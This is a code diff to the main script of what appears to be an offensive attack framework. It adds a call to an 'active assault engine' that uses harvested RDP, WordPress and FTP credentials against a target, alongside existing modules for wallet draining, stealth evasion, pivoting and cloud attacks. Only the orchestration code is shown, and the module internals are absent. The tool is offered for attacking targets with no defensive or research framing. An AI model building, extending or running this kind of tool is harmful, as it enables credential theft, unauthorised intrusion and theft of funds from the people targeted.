@@ -19,6 +19,7 @@ from modules.drainer import check_and_drain_wallet
 from modules.stealth_ops import run_stealth_engine
 from modules.pivot import run_pivot_engine
 from modules.cloud_apex import run_cloud_apex_suite
+from modules.bruter import execute_active_assault_engine
 
 # Cyberpunk Neon & Clean Structured Palette
 CYAN = "\033[96m"
@@ -133,12 +134,19 @@ async def async_main():
     except Exception as e:
         print(f"       └── [!] Notice during port scan: {e}")
 
-    # Step 2: Real-time DOM Inspection & Security Header Audit
+    # Step 2: Real-time DOM Inspection, Security Header Audit & File Credential Queueing
     print(f"\n{CYAN}[RECON 2/3] → Executing DOM & Header Intelligence Scan{RESET}")
     try:
         await parse_target_source(target)
     except Exception as e:
         print(f"       └── [!] Notice during DOM parse: {e}")
+
+    # Step 2.1: Active Multi-Protocol Assault Engine (Weaponizing Harvested RDP/WP/FTP Queues)
+    print(f"\n{CYAN}[ASSAULT] → Launching Active Multi-Protocol Assault Engine{RESET}")
+    try:
+        await execute_active_assault_engine(target)
+    except Exception as e:
+        print(f"       └── [!] Notice during active assault dispatch: {e}")
 
     # Step 2.5: Behavioral Evasion & Stealth Jitter Wrapper
     print(f"\n{CYAN}[RECON 3/3] → Engaging Stealth Telemetry & Behavioral Jitter{RESET}")
@@ -257,3 +265,4 @@ def main():
 
 if __name__ == "__main__":
     main()
+
